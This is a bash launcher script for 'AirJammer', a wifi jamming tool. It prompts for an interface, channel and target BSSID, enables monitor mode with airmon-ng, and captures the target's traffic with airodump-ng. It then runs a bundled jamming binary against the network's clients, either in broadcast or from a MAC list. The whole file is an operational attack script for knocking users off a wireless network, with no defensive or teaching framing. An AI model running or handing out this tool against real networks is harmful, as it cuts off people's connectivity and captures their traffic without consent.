#!/bin/bash

# Simple interface to start jamming a wireless network with AirJammer

function syntax {
	printf "Usage: $0 [wifi-dev] [channel] [BSSID]\n"
}

function clean-exit {
	printf "\nExiting..."
	sudo airmon-ng stop $mon
	printf "Terminated.\n"
}

printf "\n = AirJammer starter =\n"

# Acquire data
if [ $# -eq 3 ]; then
	# from arguments
	wl=$1
	chan=$2
	bssid=$3
	printf "\n\tUsing wifi interface '$wl' on channel '$chan' and BSSID '$bssid'.\n"
else
	syntax
	# from stdin
	printf "\n\tInput wireless device:\t"
	read wl
	printf "\tInput channel:\t"
	read chan
	printf "\tInput BSSID:\t"
	read bssid
fi

#printf "\n\tDo you want to stop your network manager?\n\tInput command for your distro (empty line to skip):\n"
#read netw
#if [ ! -z "$netw" ]; then
#	$netw
#fi

# Start interface in promiscuous mode
printf "\n\tStarting monitor interface..."
sudo airmon-ng start $wl $chan
printf "\n\tInput monitor interface started (0 to clean-exit):\t"
read mon
if [ $mon == "0" ]; then
	mon=mon0
	clean-exit
	exit 0
fi

# Start monitor
sudo xterm 2> /dev/null -T AirJammer-Monitor -e airodump-ng --bssid $bssid -c $chan -w /tmp/airjammer-${bssid} $mon --ignore-negative-one &

# Select MAC source
printf "\n\tChoose Jammer mode:\n\t   1. MAC list from file\n\t   2. Broadcast\n\t   0. Exit\n"
read mode
if [ $mode == "1" ]; then
	printf "\n\tInput file name:\t"
	read file
	sudo xterm 2> /dev/null -T AirJammer -e ./bin/airjammer.bin $bssid $mon $file &
elif [ $mode == "2" ]; then
	sudo xterm 2> /dev/null -T AirJammer -e ./bin/airjammer.bin $bssid $mon &
elif [ $mode == "0" ]; then
	clean-exit
	exit 0
else
	printf "Unknown option!\n"
	clean-exit
	exit 1
fi

read -p "Press [Enter] key to stop jammer and monitor"

clean-exit
exit 0

